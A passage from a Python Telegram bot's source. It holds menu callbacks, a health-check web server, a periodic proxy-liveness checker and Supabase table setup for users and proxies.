        "<code>/addfile</code>\n\n"
        "<b><i>Merge Queued Files</i></b>\n"
        "<code>/merge</code>\n\n"
        "<b><i>Clear Merge Queue</i></b>\n"
        "<code>/clearqueue</code>"
    )
    await callback.message.edit_text(text, reply_markup=markup)
    await callback.answer()

@dp.callback_query(F.data == "menu_close")
async def process_menu_close(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except Exception:
        await callback.message.edit_text("<i>Menu closed.</i>")
    await callback.answer()



from aiohttp import web

async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Dummy web server started on port {port} for Render health checks")

async def auto_proxy_checker_loop():
    while True:
        try:
            await asyncio.sleep(6 * 60 * 60) # Wake up every 6 hours
            print("Running Auto Proxy Checker...")
            users = await ProxyManager.get_all_users()
            for uid in users:
                proxies = list(await ProxyManager.get_user_proxies(uid))
                if not proxies: continue
                
                # Test all proxies (is_pool=True automatically deletes dead ones)
                live_proxies, dead_proxies, weak_proxies, _ = await test_proxy_list(proxies, True, uid)
                live_count = len(live_proxies)
                dead_count = len(dead_proxies)
                
                if dead_count > 0:
                    msg = f"<b>Proxy Cleanup</b>\n<code>Removed {dead_count} dead/blocked proxy channels. Remaining active count: {live_count}</code>"
                    try:
                        await bot.send_message(uid, msg)
                    except: pass
        except Exception as e:
            print(f"Auto proxy loop error: {e}")
            await asyncio.sleep(60) # Prevent tight crash loop

async def main() -> None:
    print("Bot is starting...")
    global db_pool
    db_url = os.environ.get("DATABASE_URL")
    if db_url:
        print("Connecting to Supabase...")
        db_pool = await asyncpg.create_pool(db_url, min_size=1, max_size=4)
        async with db_pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS user_proxies (
                    user_id BIGINT PRIMARY KEY,
                    proxies JSONB DEFAULT '[]'
                );
            """)
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS approved_users (
                    user_id BIGINT PRIMARY KEY
                );
            """)
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS registered_users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """)
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS banned_users (
                    user_id BIGINT PRIMARY KEY,
                    reason TEXT,
                    banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """)
            rows_app = await conn.fetch("SELECT user_id FROM approved_users")
            for r in rows_app:
                approved_users_set.add(r['user_id'])
                
            rows_banned = await conn.fetch("SELECT user_id FROM banned_users")
            for r in rows_banned:
                banned_users_set.add(r['user_id'])
                
            rows_reg = await conn.fetch("SELECT user_id FROM registered_users")
            for r in rows_reg:
                registered_users_set.add(r['user_id'])

        await ProxyManager.init_db(db_pool)
        print("Supabase connected! Tables (user_proxies, approved_users, registered_users, banned_users) ready!")
    else:
        print("WARNING: DATABASE_URL not set! Proxies will not be saved.")
        
        
    await start_web_server()
    asyncio.create_task(auto_proxy_checker_loop())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
